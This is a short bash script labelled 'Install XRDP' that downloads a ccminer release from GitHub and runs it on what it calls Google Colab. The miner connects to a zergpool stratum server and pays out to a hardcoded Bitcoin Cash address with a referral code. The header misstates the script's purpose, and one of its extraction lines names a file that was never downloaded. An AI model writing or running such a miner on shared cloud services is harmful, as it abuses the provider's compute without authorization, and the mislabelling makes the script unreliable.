#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/monkins1010/ccminer/archive/refs/tags/v3.7.0.tar.gz
tar -xvf v3.7.0.tgz
tar -xvf v3.7.0.tar.gz
cd ccminer-3.7.0
./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u bitcoincash:qz7acnazzq8q9f2pdtnzajgaawnyu3zepyrrl6zapt -p c=BCH,mc=VRSC,refcode=154da8859865a8ef7d211c80356df4f0,ID=AndroBchMining -t 4
